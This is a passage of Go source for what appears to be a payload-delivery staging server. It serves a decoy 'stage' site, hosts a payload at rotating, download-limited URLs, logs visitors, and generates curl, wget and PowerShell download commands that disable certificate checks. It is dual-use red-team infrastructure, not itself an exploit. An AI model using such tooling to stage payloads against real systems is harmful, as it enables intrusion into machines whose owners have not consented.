		return options, 0, ""
	}

	defaultLabel := "(config default)"
	if defaultProfile != "" {
		defaultLabel = "(config default: " + defaultProfile + ")"
	}

	options := []profileOption{{Label: defaultLabel, Value: ""}}
	selectedIndex := 0
	selectedValue := ""
	foundSelected := preferred == ""
	for _, name := range names {
		label := name
		if name == defaultProfile {
			label += " (default)"
		}
		if name == preferred {
			selectedIndex = len(options)
			selectedValue = name
			foundSelected = true
		}
		options = append(options, profileOption{Label: label, Value: name})
	}

	if !foundSelected && preferred != "" {
		options = append([]profileOption{{Label: preferred + " (not found)", Value: preferred}}, options...)
		selectedIndex = 0
		selectedValue = preferred
	}

	return options, selectedIndex, selectedValue
}

func tuiMetadataWarnings(siteErr error, payloadErr error, certErr error, headerErr error) []string {
	var warnings []string
	if siteErr != nil {
		warnings = append(warnings, "[yellow]Stage options could not be listed: "+siteErr.Error())
	}
	if payloadErr != nil {
		warnings = append(warnings, "[yellow]Payload options could not be listed: "+payloadErr.Error())
	}
	if certErr != nil {
		warnings = append(warnings, "[yellow]Certificate profiles could not be listed: "+certErr.Error())
	}
	if headerErr != nil {
		warnings = append(warnings, "[yellow]Header profiles could not be listed: "+headerErr.Error())
	}
	return warnings
}

func showTUIModal(app *tview.Application, root tview.Primitive, text string) {
	modal := tview.NewModal().
		SetText(text).
		AddButtons([]string{"OK"}).
		SetDoneFunc(func(_ int, _ string) {
			app.SetRoot(root, true)
		})
	app.SetRoot(modal, true)
}

func tuiPreflightSummary(config AppConfig) string {
	downloadPort, err := effectiveDownloadPort(config)
	downloadPortText := "derived"
	if err == nil {
		downloadPortText = strconv.Itoa(downloadPort)
	}

	payload := config.PayloadFile
	if payload == "" {
		payload = "(none)"
	}

	return fmt.Sprintf(
		"Preflight passed.\n\nSite: %s\nPayload: %s\nHTTP: %s\nHTTPS: %s\nDownload port: %s\nLog dir: %s",
		config.SitePath,
		payload,
		config.HTTPAddr,
		config.HTTPSAddr,
		downloadPortText,
		config.LogDir,
	)
}

func runServerDashboard(config AppConfig) error {
	events := newAccessEventBuffer(20)
	runtime, err := startAppRuntime(config, RuntimeStartOptions{
		PrintStartup:            false,
		PrintPayloadCommands:    false,
		MirrorAccessLogToStdout: false,
		AccessObservers:         []AccessLogObserver{events.Observe},
	})
	if err != nil {
		return err
	}
	defer runtime.Close()

	app := tview.NewApplication()
	statusView := newDashboardTextView("Status", tcell.ColorSeaGreen)
	payloadView := newDashboardTextView("Payload", tcell.ColorDeepSkyBlue)
	commandsView := newDashboardTextView("Download Commands", tcell.ColorMediumPurple)
	recentView := newDashboardTextView("Recent Requests", tcell.ColorGoldenrod)
	footerView := tview.NewTextView().
		SetDynamicColors(true)

	top := tview.NewFlex().
		AddItem(statusView, 0, 1, false).
		AddItem(payloadView, 0, 1, false)
	middle := tview.NewFlex().
		AddItem(commandsView, 0, 1, false).
		AddItem(recentView, 0, 1, false)
	root := tview.NewFlex().
		SetDirection(tview.FlexRow).
		AddItem(top, 10, 0, false).
		AddItem(middle, 0, 1, false).
		AddItem(footerView, 1, 0, false)

	requestFilter := requestFilterAll
	dashboardMessage := "Dashboard running."
	refresh := func() {
		snapshot := events.Snapshot()
		statusView.SetText(renderDashboardStatus(runtime, snapshot))
		payloadView.SetText(renderDashboardPayload(runtime))
		commandsView.SetText(renderDashboardCommands(runtime))
		recentView.SetTitle(" Recent Requests: " + string(requestFilter) + " ")
		recentView.SetText(renderRecentRequests(snapshot, requestFilter))
		footerView.SetText(renderDashboardFooter(requestFilter, dashboardMessage))
	}
	refresh()

	app.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		switch event.Key() {
		case tcell.KeyCtrlC, tcell.KeyEsc:
			app.Stop()
			return nil
		}
		switch event.Rune() {
		case 'q', 'Q':
			app.Stop()
			return nil
		case 'p', 'P':
			showPayloadPicker(app, root, runtime, refresh, &dashboardMessage)
			return nil
		case 'r', 'R':
			if runtime.Payload == nil || !runtime.Payload.Active() {
				dashboardMessage = "No active payload to rotate."
			} else {
				nextPath := runtime.Payload.Rotate()
				dashboardMessage = "Payload URL rotated to " + buildPayloadURL(runtime.DownloadBaseURL, nextPath)
			}
			refresh()
			return nil
		case 'n', 'N':
			if runtime.Payload != nil {
				runtime.Payload.Disable()
			}
			dashboardMessage = "Payload disabled."
			refresh()
			return nil
		case 'f', 'F':
			requestFilter = nextRequestFilter(requestFilter)
			dashboardMessage = "Recent request filter: " + string(requestFilter)
			refresh()
			return nil
		case 'c', 'C':
			showDashboardCommandsView(app, root, runtime, refresh)
			return nil
		}
		return event
	})

	done := make(chan struct{})
	serverErrs := make(chan error, 1)
	go func() {
		if err := <-runtime.Errors(); err != nil {
			serverErrs <- err
			app.Stop()
		}
	}()
	go func() {
		ticker := time.NewTicker(time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				app.QueueUpdateDraw(refresh)
			case <-done:
				return
			}
		}
	}()

	appErr := app.SetRoot(root, true).EnableMouse(true).Run()
	close(done)
	select {
	case err := <-serverErrs:
		if err != nil {
			return err
		}
	default:
	}
	return appErr
}

func newDashboardTextView(title string, borderColor tcell.Color) *tview.TextView {
	view := tview.NewTextView()
	view.SetDynamicColors(true)
	view.SetWordWrap(true)
	view.SetScrollable(true)
	view.SetBorder(true)
	view.SetTitle(" " + title + " ")
	view.SetBorderColor(borderColor)
	view.SetTitleColor(borderColor)
	return view
}

func renderDashboardFooter(filter DashboardRequestFilter, message string) string {
	return fmt.Sprintf(
		"[gray]Keys:[-] [green::b]p[-:-:-] payload | [green::b]r[-:-:-] rotate URL | [green::b]n[-:-:-] no payload | [green::b]f[-:-:-] filter:%s | [green::b]c[-:-:-] commands | [green::b]q[-:-:-]/Esc/Ctrl+C quit  [gray]Status:[-] %s",
		tuiText(string(filter)),
		tuiText(message),
	)
}

func showPayloadPicker(app *tview.Application, root tview.Primitive, runtime *AppRuntime, refresh func(), dashboardMessage *string) {
	currentPayload := ""
	if runtime.Payload != nil {
		currentPayload = runtime.Payload.CurrentFile()
	}

	options, selectedIndex, _, err := payloadFileOptions(defaultPayloadOptionsDir, currentPayload)
	if err != nil {
		showTUIModal(app, root, "Payload options could not be listed:\n\n"+err.Error())
		return
	}

	list := tview.NewList()
	list.SetBorder(true).SetTitle(" Payload Options ")
	list.SetMainTextColor(tcell.ColorWhite)
	list.SetSelectedTextColor(tcell.ColorBlack)
	list.SetSelectedBackgroundColor(tcell.ColorDeepSkyBlue)
	list.ShowSecondaryText(false)
	for _, option := range options {
		option := option
		list.AddItem(option.Label, option.Value, 0, func() {
			if runtime.Payload == nil {
				*dashboardMessage = "Payload runtime is not available."
				app.SetRoot(root, true)
				refresh()
				return
			}
			if option.Value == "" {
				runtime.Payload.Disable()
				*dashboardMessage = "Payload disabled."
			} else if err := runtime.Payload.Swap(option.Value, runtime.Config.OutputName, true); err != nil {
				*dashboardMessage = "Payload swap failed: " + err.Error()
			} else {
				*dashboardMessage = "Payload swapped and URL rotated: " + option.Value
			}
			app.SetRoot(root, true)
			refresh()
		})
	}
	list.SetCurrentItem(selectedIndex)
	list.SetDoneFunc(func() {
		app.SetRoot(root, true)
		refresh()
	})
	app.SetRoot(list, true).SetFocus(list)
}

func showDashboardCommandsView(app *tview.Application, root tview.Primitive, runtime *AppRuntime, refresh func()) {
	commands := newDashboardTextView(" Download Commands ", tcell.ColorMediumPurple)
	commands.SetText(renderDashboardCommands(runtime))
	commands.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEsc || event.Key() == tcell.KeyCtrlC {
			app.SetRoot(root, true)
			refresh()
			return nil
		}
		if event.Rune() == 'q' || event.Rune() == 'Q' || event.Rune() == 'c' || event.Rune() == 'C' {
			app.SetRoot(root, true)
			refresh()
			return nil
		}
		return event
	})
	app.SetRoot(commands, true).SetFocus(commands)
}

func renderDashboardStatus(runtime *AppRuntime, snapshot DashboardSnapshot) string {
	lastRequest := snapshot.LastRequest
	if lastRequest == "" {
		lastRequest = "none"
	}

	return fmt.Sprintf(
		"[green::b]State:[-:-:-] [green]running[-]\n[deepskyblue]HTTP:[-] %s\n[deepskyblue]HTTPS:[-] %s\n[yellow]Site:[-] %s\n[mediumpurple]Cert profile:[-] %s\n[mediumpurple]Header profile:[-] %s\n[gray]Logs:[-] %s\n[white::b]Requests:[-:-:-] [white]total[-] %d | [green]success[-] %d | [yellow]404[-] %d | [red]server errors[-] %d\n[gray]Last request:[-] %s",
		tuiText(runtime.Config.HTTPAddr),
		tuiText(runtime.Config.HTTPSAddr),
		tuiText(runtime.Config.SitePath),
		tuiText(displayValue(runtime.CertProfile, "config default")),
		tuiText(displayValue(runtime.HeaderProfile, "config default")),
		tuiText(dashboardLogSummary(runtime.Config)),
		snapshot.Total,
		snapshot.Success,
		snapshot.NotFound,
		snapshot.ServerErrors,
		tuiText(lastRequest),
	)
}

func dashboardLogSummary(config AppConfig) string {
	if config.NoAccessLog {
		return filepath.Join(config.LogDir, "gin.log") + " (access log disabled)"
	}
	if config.JSONLogs {
		return filepath.Join(config.LogDir, "access.log") + " (JSON)"
	}
	return filepath.Join(config.LogDir, "access.log")
}

func renderDashboardPayload(runtime *AppRuntime) string {
	if runtime.Payload == nil || !runtime.Payload.Active() {
		return "[yellow]No payload configured.[-]\nThe selected site is being served over HTTP and HTTPS."
	}

	options := runtime.Payload.CurrentCommandOptions(runtime.DownloadBaseURL)
	certificateMode := "trusted/external"
	if options.SelfSignedCert {
		certificateMode = "self-signed"
	}
	if options.LocalCACert {
		certificateMode = "local CA (not trusted by default)"
	}

	return fmt.Sprintf(
		"[green::b]URL:[-:-:-] %s\n[deepskyblue]File:[-] %s\n[deepskyblue]Output file:[-] %s\n[yellow]Policy:[-] %s\n[mediumpurple]Certificate:[-] %s",
		tuiText(options.URL),
		tuiText(runtime.Payload.CurrentFile()),
		tuiText(options.OutputFile),
		tuiText(payloadPolicyText(options.MaxDownloads)),
		tuiText(certificateMode),
	)
}

func renderDashboardCommands(runtime *AppRuntime) string {
	if runtime.Payload == nil || !runtime.Payload.Active() {
		return "[yellow]No payload configured[-], so there are no download commands."
	}

	var builder strings.Builder
	for _, command := range renderDownloadCommands(runtime.Payload.CurrentCommandOptions(runtime.DownloadBaseURL)) {
		builder.WriteString("[mediumpurple::b]")
		builder.WriteString(command.Label)
		builder.WriteString("[-:-:-]\n")
		builder.WriteString(tuiText(command.Command))
		builder.WriteString("\n\n")
	}
	return strings.TrimSpace(builder.String())
}

func renderRecentRequests(snapshot DashboardSnapshot, filter DashboardRequestFilter) string {
	recent := filterRecentRequests(snapshot.Recent, filter)
	if len(recent) == 0 {
		return "[gray]No requests yet.[-]"
	}

	var builder strings.Builder
	builder.WriteString("[gray]time      code method path                                       latency    client[-]\n")
	for _, entry := range recent {
		fmt.Fprintf(
			&builder,
			"%s  %s  [deepskyblue]%-6s[-] %-42s %8.3fms  %s\n",
			tuiText(shortTimestamp(entry.Timestamp)),
			dashboardStatusCode(entry.Status),
			tuiText(entry.Method),
			tuiText(trimDashboardText(entry.Path, 42)),
			entry.LatencyMS,
			tuiText(trimDashboardText(entry.ClientIP, 24)),
		)
	}
	return strings.TrimRight(builder.String(), "\n")
}

func filterRecentRequests(entries []AccessLogEntry, filter DashboardRequestFilter) []AccessLogEntry {
	if filter == requestFilterAll {
		return entries
	}

	filtered := make([]AccessLogEntry, 0, len(entries))
	for _, entry := range entries {
		if requestMatchesFilter(entry, filter) {
			filtered = append(filtered, entry)
		}
	}
	return filtered
}

func requestMatchesFilter(entry AccessLogEntry, filter DashboardRequestFilter) bool {
	switch filter {
	case requestFilterSuccess:
		return entry.Status >= 200 && entry.Status < 400
	case requestFilterNotFound:
		return entry.Status == http.StatusNotFound
	case requestFilterErrors:
		return entry.Status >= 500 || entry.Errors != ""
	default:
		return true
	}
}

func nextRequestFilter(filter DashboardRequestFilter) DashboardRequestFilter {
	switch filter {
	case requestFilterAll:
		return requestFilterSuccess
	case requestFilterSuccess:
		return requestFilterNotFound
	case requestFilterNotFound:
		return requestFilterErrors
	default:
		return requestFilterAll
	}
}

func dashboardStatusCode(status int) string {
	statusText := strconv.Itoa(status)
	switch {
	case status >= 200 && status < 300:
		return "[green]" + statusText + "[-]"
	case status >= 300 && status < 400:
		return "[deepskyblue]" + statusText + "[-]"
	case status == http.StatusNotFound:
		return "[yellow]" + statusText + "[-]"
	case status >= 400 && status < 500:
		return "[orange]" + statusText + "[-]"
	case status >= 500:
		return "[red]" + statusText + "[-]"
	default:
		return "[gray]" + statusText + "[-]"
	}
}

func tuiText(value string) string {
	return tview.Escape(value)
}

func payloadPolicyText(maxDownloads int) string {
	if maxDownloads == 0 {
		return "persistent"
	}
	return fmt.Sprintf("expires after %d download(s)", maxDownloads)
}

func displayValue(value string, fallback string) string {
	if strings.TrimSpace(value) == "" {
		return fallback
	}
	return value
}

func shortTimestamp(timestamp string) string {
	parsed, err := time.Parse(time.RFC3339Nano, timestamp)
	if err != nil {
		return timestamp
	}
	return parsed.Format("15:04:05")
}

func trimDashboardText(value string, maxLength int) string {
	if maxLength <= 0 || len(value) <= maxLength {
		return value
	}
	if maxLength <= 3 {
		return value[:maxLength]
	}
	return value[:maxLength-3] + "..."
}

func (p *PayloadRuntime) Active() bool {
	return p != nil && p.Manager != nil && p.Manager.Active()
}

func (p *PayloadRuntime) CurrentFile() string {
	if p == nil || p.Manager == nil {
		return ""
	}
	return p.Manager.FilePath()
}

func (p *PayloadRuntime) Swap(filePath string, configuredOutputName string, rotateURL bool) error {
	if p == nil || p.Manager == nil {
		return fmt.Errorf("payload runtime is not available")
	}
	if filePath != "" {
		if err := validatePayloadFile(filePath); err != nil {
			return err
		}
	}

	p.mu.Lock()
	defer p.mu.Unlock()

	p.Manager.SwapFile(filePath, rotateURL)
	p.Options.OutputFile = ""
	if filePath != "" {
		p.Options.OutputFile = payloadOutputName(filePath, configuredOutputName)
	}
	return nil
}

func (p *PayloadRuntime) Disable() {
	if p == nil || p.Manager == nil {
		return
	}

	p.mu.Lock()
	defer p.mu.Unlock()
	p.Manager.Disable()
	p.Options.OutputFile = ""
}

func (p *PayloadRuntime) Rotate() string {
	if p == nil || p.Manager == nil {
		return ""
	}
	return p.Manager.RotatePath()
}

func (p *PayloadRuntime) CurrentCommandOptions(downloadBaseURL string) DownloadCommandOptions {
	p.mu.Lock()
	options := p.Options
	p.mu.Unlock()
	if p.Manager != nil {
		options.URL = buildPayloadURL(downloadBaseURL, p.Manager.CurrentPath())
	}
	return options
}

func newAccessEventBuffer(limit int) *AccessEventBuffer {
	if limit <= 0 {
		limit = 20
	}
	return &AccessEventBuffer{limit: limit}
}

func (b *AccessEventBuffer) Observe(entry AccessLogEntry) {
	b.mu.Lock()
	defer b.mu.Unlock()

	b.total++
	if entry.Status >= 200 && entry.Status < 400 {
		b.success++
	}
	if entry.Status == http.StatusNotFound {
		b.notFound++
	}
	if entry.Status >= 500 || entry.Errors != "" {
		b.serverErrors++
	}
	b.lastRequest = fmt.Sprintf("%s %s -> %d", entry.Method, entry.Path, entry.Status)

	b.recent = append([]AccessLogEntry{entry}, b.recent...)
	if len(b.recent) > b.limit {
		b.recent = b.recent[:b.limit]
	}
}

func (b *AccessEventBuffer) Snapshot() DashboardSnapshot {
	b.mu.Lock()
	defer b.mu.Unlock()

	recent := make([]AccessLogEntry, len(b.recent))
	copy(recent, b.recent)
	return DashboardSnapshot{
		Total:        b.total,
		Success:      b.success,
		NotFound:     b.notFound,
		ServerErrors: b.serverErrors,
		LastRequest:  b.lastRequest,
		Recent:       recent,
	}
}

func startWebServers(handler http.Handler, httpAddr string, httpsAddr string, certFile string, keyFile string) (*WebServers, error) {
	httpListener, err := openTCPListener("HTTP", httpAddr)
	if err != nil {
		return nil, err
	}

	tlsCertificate, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		httpListener.Close()
		return nil, formatTLSCertificateError(certFile, keyFile, err)
	}

	httpsListener, err := openTCPListener("HTTPS", httpsAddr)
	if err != nil {
		httpListener.Close()
		return nil, err
	}

	serverErrors := make(chan error, 2)
	httpServer := &http.Server{
		Addr:    httpAddr,
		Handler: handler,
	}
	httpsServer := &http.Server{
		Addr:    httpsAddr,
		Handler: handler,
		TLSConfig: &tls.Config{
			Certificates: []tls.Certificate{tlsCertificate},
			MinVersion:   tls.VersionTLS12,
		},
	}

	go serveHTTPServer("HTTP", httpServer, httpListener, serverErrors)
	go serveHTTPServer("HTTPS", httpsServer, tls.NewListener(httpsListener, httpsServer.TLSConfig), serverErrors)

	return &WebServers{
		httpServer:  httpServer,
		httpsServer: httpsServer,
		errors:      serverErrors,
	}, nil
}

func (r *AppRuntime) Errors() <-chan error {
	if r == nil || r.WebServers == nil {
		closed := make(chan error)
		close(closed)
		return closed
	}
	return r.WebServers.errors
}

func (r *AppRuntime) Shutdown(ctx context.Context) error {
	if r == nil || r.WebServers == nil {
		return nil
	}
	return r.WebServers.Shutdown(ctx)
}

func (r *AppRuntime) Close() error {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	shutdownErr := r.Shutdown(ctx)
	if r != nil && r.Logs != nil {
		r.Logs.Close()
	}
	return shutdownErr
}

func (s *WebServers) Shutdown(ctx context.Context) error {
	if s == nil {
		return nil
	}

	var messages []string
	if s.httpServer != nil {
		if err := s.httpServer.Shutdown(ctx); err != nil && !errors.Is(err, http.ErrServerClosed) {
			messages = append(messages, "HTTP: "+err.Error())
		}
	}
	if s.httpsServer != nil {
		if err := s.httpsServer.Shutdown(ctx); err != nil && !errors.Is(err, http.ErrServerClosed) {
			messages = append(messages, "HTTPS: "+err.Error())
		}
	}
	if len(messages) > 0 {
		return errors.New(strings.Join(messages, "; "))
	}
	return nil
}

func openTCPListener(protocol string, addr string) (net.Listener, error) {
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		return nil, formatListenerError(protocol, addr, err)
	}
	return listener, nil
}

func serveHTTPServer(protocol string, server *http.Server, listener net.Listener, serverErrors chan<- error) {
	if err := server.Serve(listener); err != nil && !errors.Is(err, http.ErrServerClosed) {
		serverErrors <- fmt.Errorf("%s server stopped unexpectedly on %s: %w", protocol, server.Addr, err)
	}
}

func formatListenerError(protocol string, addr string, err error) error {
	return fmt.Errorf("%s listener could not bind to %s: %w\n%s", protocol, addr, err, listenerErrorSuggestion(protocol, addr, err))
}

func listenerErrorSuggestion(protocol string, addr string, err error) string {
	lowerErr := strings.ToLower(err.Error())
	protocolFlag := strings.ToLower(protocol)
	fallbackAddr := ":8080"
	if protocolFlag == "https" {
		fallbackAddr = ":8443"
	}

	if errors.Is(err, os.ErrPermission) || strings.Contains(lowerErr, "permission denied") || strings.Contains(lowerErr, "access is denied") {
		return fmt.Sprintf("Binding %s may require elevated privileges. Run as administrator/root, or choose a non-privileged port with --%s-addr %s.", addr, protocolFlag, fallbackAddr)
	}
	if strings.Contains(lowerErr, "address already in use") || strings.Contains(lowerErr, "only one usage of each socket address") {
		return fmt.Sprintf("The port for %s appears to be in use. Stop the other process, or choose a different port with --%s-addr %s.", addr, protocolFlag, fallbackAddr)
	}
	if strings.Contains(lowerErr, "cannot assign requested address") {
		return fmt.Sprintf("The address %s is not assigned to this host. Use an address on this machine, or bind all interfaces with --%s-addr %s.", addr, protocolFlag, fallbackAddr)
	}

	return fmt.Sprintf("Check the listen address syntax and local firewall/security policy. For non-privileged testing, try --%s-addr %s.", protocolFlag, fallbackAddr)
}

func formatTLSCertificateError(certFile string, keyFile string, err error) error {
	if errors.Is(err, os.ErrNotExist) {
		return fmt.Errorf("TLS certificate setup failed: could not find %s or %s: %w\nCheck that certificate generation completed successfully, or provide readable cert/key files when existing-cert support is added", certFile, keyFile, err)
	}
	if errors.Is(err, os.ErrPermission) {
		return fmt.Errorf("TLS certificate setup failed: permission denied reading %s or %s: %w\nCheck file permissions and run from a directory where the generated cert/key are readable", certFile, keyFile, err)
	}
	return fmt.Errorf("TLS certificate setup failed while loading %s and %s: %w\nCheck that both files are valid PEM data and that the private key matches the certificate", certFile, keyFile, err)
}

func startConsoleCommandLoop(onQuit func()) {
	go func() {
		scanner := bufio.NewScanner(os.Stdin)
		for {
			fmt.Print("command>")
			if !scanner.Scan() {
				return
			}
			cmd := strings.TrimSpace(scanner.Text())
			if cmd == "quit" || cmd == "exit" {
				onQuit()
				return
			}
		}
	}()
}

func setupRuntimeLogs(logDir string, noAccessLog bool, jsonLogs bool) (*RuntimeLogs, error) {
	return setupRuntimeLogsWithOptions(logDir, noAccessLog, jsonLogs, true)
}

func setupRuntimeLogsWithOptions(logDir string, noAccessLog bool, jsonLogs bool, mirrorAccessLogToStdout bool, observers ...AccessLogObserver) (*RuntimeLogs, error) {
	if logDir == "" {
		logDir = "."
	}
	cleanLogDir := filepath.Clean(logDir)
	if err := os.MkdirAll(cleanLogDir, 0755); err != nil {
		return nil, fmt.Errorf("create log directory: %w", err)
	}

	ginLog, err := os.OpenFile(filepath.Join(cleanLogDir, "gin.log"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return nil, fmt.Errorf("open gin log: %w", err)
	}

	runtimeLogs := &RuntimeLogs{
		files:     []*os.File{ginLog},
		ginWriter: ginLog,
	}

	if noAccessLog && len(observers) == 0 {
		return runtimeLogs, nil
	}

	var accessWriter io.Writer
	if !noAccessLog {
		accessLog, err := os.OpenFile(filepath.Join(cleanLogDir, "access.log"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			runtimeLogs.Close()
			return nil, fmt.Errorf("open access log: %w", err)
		}

		runtimeLogs.files = append(runtimeLogs.files, accessLog)
		if mirrorAccessLogToStdout {
			accessWriter = io.MultiWriter(os.Stdout, accessLog)
		} else {
			accessWriter = accessLog
		}
	}

	accessLogger := &AccessLogger{
		writer:     accessWriter,
		jsonFormat: jsonLogs,
		observers:  observers,
	}
	runtimeLogs.accessMiddleware = accessLogger.Middleware()

	return runtimeLogs, nil
}

func (l *RuntimeLogs) Close() {
	for _, file := range l.files {
		if file != nil {
			file.Close()
		}
	}
}

func (l *AccessLogger) Middleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		start := time.Now()
		c.Next()

		entry := AccessLogEntry{
			Timestamp: time.Now().Format(time.RFC3339Nano),
			ClientIP:  c.ClientIP(),
			UserAgent: c.Request.UserAgent(),
			Method:    c.Request.Method,
			Path:      c.Request.URL.RequestURI(),
			Status:    c.Writer.Status(),
			LatencyMS: float64(time.Since(start).Microseconds()) / 1000,
		}
		if len(c.Errors) > 0 {
			entry.Errors = c.Errors.String()
		}

		if err := l.Write(entry); err != nil {
			log.Printf("[!] Failed to write access log: %v", err)
		}
	}
}

func (l *AccessLogger) Write(entry AccessLogEntry) error {
	if l.writer != nil {
		line, err := formatAccessLogEntry(entry, l.jsonFormat)
		if err != nil {
			return err
		}

		l.mu.Lock()
		_, err = fmt.Fprintln(l.writer, line)
		l.mu.Unlock()
		if err != nil {
			return err
		}
	}

	for _, observer := range l.observers {
		if observer != nil {
			observer(entry)
		}
	}
	return nil
}

func formatAccessLogEntry(entry AccessLogEntry, jsonFormat bool) (string, error) {
	if jsonFormat {
		data, err := json.Marshal(entry)
		if err != nil {
			return "", err
		}
		return string(data), nil
	}

	line := fmt.Sprintf(
		"[%s] IP: %s | Method: %s | Path: %s | Status: %d | Latency: %.3fms | User-Agent: %s",
		entry.Timestamp,
		entry.ClientIP,
		entry.Method,
		entry.Path,
		entry.Status,
		entry.LatencyMS,
		entry.UserAgent,
	)
	if entry.Errors != "" {
		line += " | Errors: " + entry.Errors
	}
	return line, nil
}

func validatePayloadFile(path string) error {
	info, err := os.Stat(path)
	if err != nil {
		return fmt.Errorf("payload file is not readable: %w", err)
	}
	if info.IsDir() {
		return fmt.Errorf("payload path must be a file, got directory: %s", path)
	}
	return nil
}

func validateSitePath(sitePath string) error {
	info, err := os.Stat(sitePath)
	if err != nil {
		return fmt.Errorf("site path %q is not readable: %w\nChoose a stage under ./stage_options, for example --site ./stage_options/IC-STAGE-3", sitePath, err)
	}
	if !info.IsDir() {
		return fmt.Errorf("site path %q must be a directory", sitePath)
	}

	indexPath := filepath.Join(sitePath, "index.html")
	if _, err := os.Stat(indexPath); err != nil {
		return fmt.Errorf("site path %q is missing index.html: %w\nChoose a stage directory with an index.html file", sitePath, err)
	}

	matches, err := filepath.Glob(filepath.Join(sitePath, "*.html"))
	if err != nil {
		return fmt.Errorf("site path %q has an invalid HTML glob: %w", sitePath, err)
	}
	if len(matches) == 0 {
		return fmt.Errorf("site path %q has no .html files\nChoose a stage under ./stage_options, for example --site ./stage_options/IC-STAGE-3", sitePath)
	}

	return nil
}

func newPayloadManager(filePath string, maxDownloads int, generateNextPath func() string) *PayloadManager {
	if generateNextPath == nil {
		generateNextPath = randomPayloadPath
	}

	manager := &PayloadManager{
		filePath:         filePath,
		maxDownloads:     maxDownloads,
		generateNextPath: generateNextPath,
	}
	if filePath != "" {
		manager.rotateLocked()
	}
	return manager
}

func (m *PayloadManager) Active() bool {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.filePath != "" && m.currentPath != ""
}

func (m *PayloadManager) FilePath() string {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.filePath
}

func (m *PayloadManager) CurrentPath() string {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.currentPath
}

func (m *PayloadManager) SwapFile(filePath string, rotateURL bool) {
	m.mu.Lock()
	defer m.mu.Unlock()

	m.filePath = filePath
	if filePath == "" {
		m.currentPath = ""
		m.pathDownloads = 0
		return
	}
	if rotateURL || m.currentPath == "" {
		m.rotateLocked()
		return
	}
	m.pathDownloads = 0
}

func (m *PayloadManager) Disable() {
	m.SwapFile("", true)
}

func (m *PayloadManager) RotatePath() string {
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.filePath == "" {
		return ""
	}
	m.rotateLocked()
	return m.currentPath
}

func (m *PayloadManager) Match(requestPath string) (PayloadMatch, bool) {
	m.mu.Lock()
	defer m.mu.Unlock()

	if m.filePath == "" || m.currentPath == "" || requestPath != m.currentPath {
		return PayloadMatch{}, false
	}

	match := PayloadMatch{FilePath: m.filePath}
	if m.maxDownloads > 0 {
		m.pathDownloads++
		if m.pathDownloads >= m.maxDownloads {
			match.ExpiredPath = m.currentPath
			m.rotateLocked()
			match.NewPath = m.currentPath
		}
	}

	return match, true
}

func (m *PayloadManager) rotateLocked() {
	oldPath := m.currentPath
	nextPath := m.generateNextPath()
	for attempts := 0; attempts < 5 && nextPath == oldPath; attempts++ {
		nextPath = m.generateNextPath()
	}
	m.currentPath = nextPath
	m.pathDownloads = 0
}

func buildDownloadBaseURL(configuredHost string, configuredPort int, certHosts []string) (string, error) {
	if configuredPort <= 0 || configuredPort > 65535 {
		return "", fmt.Errorf("download-port must be between 1 and 65535")
	}

	host := strings.TrimSpace(configuredHost)
	if host == "" {
		host = defaultDownloadHost(certHosts)
	}
	if host == "" {
		host = "localhost"
	}
	if strings.Contains(host, "://") {
		return "", fmt.Errorf("download-host should be a host or IP only, not a URL")
	}

	if configuredPort == 443 {
		return "https://" + formatURLHost(host), nil
	}
	return "https://" + net.JoinHostPort(host, strconv.Itoa(configuredPort)), nil
}

func portFromListenAddr(addr string) (int, error) {
	addr = strings.TrimSpace(addr)
	if addr == "" {
		return 0, fmt.Errorf("listen address is empty")
	}

	_, portText, err := net.SplitHostPort(addr)
	if err != nil {
		if strings.Count(addr, ":") == 1 && strings.HasPrefix(addr, ":") {
			portText = strings.TrimPrefix(addr, ":")
		} else {
			return 0, err
		}
	}

	port, err := strconv.Atoi(portText)
	if err != nil {
		return 0, err
	}
	if port <= 0 || port > 65535 {
		return 0, fmt.Errorf("port must be between 1 and 65535")
	}
	return port, nil
}

func defaultDownloadHost(certHosts []string) string {
	for _, host := range certHosts {
		host = strings.TrimSpace(host)
		if host != "" {
			return host
		}
	}
	return "localhost"
}

func formatURLHost(host string) string {
	if ip := net.ParseIP(host); ip != nil && strings.Contains(host, ":") {
		return "[" + host + "]"
	}
	return host
}

func buildPayloadURL(baseURL string, payloadPath string) string {
	return strings.TrimRight(baseURL, "/") + "/" + strings.TrimLeft(payloadPath, "/")
}

func payloadOutputName(payloadFile string, configuredOutputName string) string {
	if configuredOutputName = strings.TrimSpace(configuredOutputName); configuredOutputName != "" {
		return configuredOutputName
	}

	baseName := filepath.Base(payloadFile)
	if baseName == "." || baseName == string(filepath.Separator) || baseName == "" {
		return "payload"
	}
	return baseName
}

func renderDownloadCommands(options DownloadCommandOptions) []DownloadCommand {
	url := posixQuote(options.URL)
	outputFile := posixQuote(options.OutputFile)
	needsCertificateBypass := options.SelfSignedCert || options.LocalCACert
	curlArgs := []string{"curl"}
	wgetArgs := []string{"wget"}
	if needsCertificateBypass {
		curlArgs = append(curlArgs, "-k")
		wgetArgs = append(wgetArgs, "--no-check-certificate")
	}
	curlArgs = append(curlArgs, "-L", "--fail", "-o", outputFile, url)
	wgetArgs = append(wgetArgs, "-O", outputFile, url)

	powershellCommand := fmt.Sprintf("Invoke-WebRequest -Uri %s -OutFile %s", powershellQuote(options.URL), powershellQuote(options.OutputFile))
	if needsCertificateBypass {
		powershellCommand = fmt.Sprintf("Invoke-WebRequest -SkipCertificateCheck -Uri %s -OutFile %s", powershellQuote(options.URL), powershellQuote(options.OutputFile))
	}

	windowsPowerShellCommand := fmt.Sprintf("Invoke-WebRequest -Uri %s -OutFile %s", powershellQuote(options.URL), powershellQuote(options.OutputFile))
	if needsCertificateBypass {
		windowsPowerShellCommand = fmt.Sprintf("[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; Invoke-WebRequest -Uri %s -OutFile %s", powershellQuote(options.URL), powershellQuote(options.OutputFile))
	}

